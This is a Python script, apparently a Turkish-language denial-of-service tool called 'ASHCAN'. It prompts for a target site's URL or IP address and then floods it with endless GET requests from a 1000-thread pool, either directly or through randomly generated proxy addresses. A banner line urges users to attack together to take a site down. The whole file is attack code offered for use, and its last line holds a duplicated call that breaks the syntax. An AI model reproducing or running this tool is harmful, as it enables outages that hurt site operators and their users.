import urllib.request

import random

from user_agent import generate_user_agent

from urllib.request import ProxyHandler, build_opener

from concurrent.futures import ThreadPoolExecutor as tred

import time

import os

from pyfiglet import Figlet

 

# Color codes

F = '\033[1;32m'  # Green

Z = '\033[1;31m'  # Red

S = '\033[1;33m'  # Yellow

B = '\x1b[38;5;208m'  # Orange

M = '\033[1;35m'  # Magenta

 

def rainbow_text(text, duration=3):

    colors = ['\033[1;31m', '\033[1;33m', '\033[1;32m', '\033[1;36m', '\033[1;34m', '\033[1;35m']

    end_time = time.time() + duration

    while time.time() < end_time:

        for color in colors:

            print(color + text + '\033[0m', end='\r', flush=True)

            time.sleep(0.1)

 

def display_figlet():

    fig = Figlet(font='standard')  # Use the standard font

    logo = fig.renderText('A S H C A N')

    print(F + logo)

 

def display_thank_you_message():

    print(F +                         "discord.gg/1937")

    print(F + " Not: Siteyi Çökertmek İstiyorsanız Çok Kişiyle DDoS Atın.")

    print(F + '~' * 30)

 

def display_plain_text():

    print(F + '         •Güncelllemeler•')

    print(F + '       Daha Hızlı DDoS Atar.')

    print(F + ' Proxyler Daha İyi Yapılmıştır.')

    print(F + '     Görünüşü Değişmiştir.')

    print(M + '        DDoS By:  Ash& Mehdikamber')

    print(F + '~' * 30)

 

def baglanti():

    sg = input(

        f'''

═════════════════════════════════

{Z}[1] Proxy'siz Saldırı

═════════════════════════════════

{S}[2] Proxy ile Saldırı

═════════════════════════════════

{S}[{S}⌯{S}]{F}Numara Seçin {F}» '''

    )

    if sg == '1':

        ProxyOlmayanSaldiri()

    elif sg == '2':

        ProxyliSaldiri()

 

def ProxyOlmayanSaldiri():

    with tred(max_workers=1000) as pool:  # Increase thread pool size

        while True:

            pool.map(saldiri, range(100000))  # Map function to achieve high request rate

 

def saldiri(_):

    headers = {

        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',

        'Accept-Language': 'en-us,en;q=0.5',

        'Accept-Encoding': 'gzip,deflate',

        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',

        'Keep-Alive': '115',

        'Connection': 'keep-alive',

        'User-Agent': generate_user_agent()

    }

    try:

        req = urllib.request.urlopen(

            urllib.request.Request(url, headers=headers)

        )

        if req.status == 200:

            print(f'{F}İyi Saldırı: {url}')

        else:

            print(f'{Z}Kötü Saldırı: {url}')

    except:

        print(f'{S}Düşük: {url}')

        pass

 

def ProxyliSaldiri():

    with tred(max_workers=1000) as pool:  # Increase thread pool size

        while True:

            pool.map(proxyli_saldiri, range(10000))  # Map function to achieve high request rate

 

def proxyli_saldiri(_):

    ip = ".".join(str(random.randint(0, 255)) for _ in range(4))

    pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900]

    port = random.choice(pl)

    proxy = ip + ":" + str(port)

    headers = {

        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',

        'Accept-Language': 'en-us,en;q=0.5',

        'Accept-Encoding': 'gzip,deflate',

        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',

        'Keep-Alive': '115',

        'Connection': 'keep-alive',

        'User-Agent': generate_user_agent()

    }

    try:

        prox = ProxyHandler({'http': 'http://' + proxy})

        opener = build_opener(prox)

        req = opener.open(urllib.request.Request(url, headers=headers))

        if req.status == 200:

            print(f'{F}İyi Saldırı: {url} | {proxy}')

        else:

            print(f'{Z}Kötü Saldırı: {url} | {proxy}')

    except:

        print(f'{S}Düşük: {url} | {proxy}')

        pass

 

# Main execution

if __name__ == "__main__":

    rainbow_text("Root By | ash.")

    time.sleep(1)  # Additional sleep to allow the final color to be visible before clearing

    os.system('cls' if os.name == 'nt' else 'clear')  # Clear the screen

    display_thank_you_message()  # Print thank you message first

    display_plain_text()  # Print updates after the thank you message

    url = input(f'{B}Hedef Sitenin URL veya IP Adresi Girin: ')

    baglanti()    baglanti()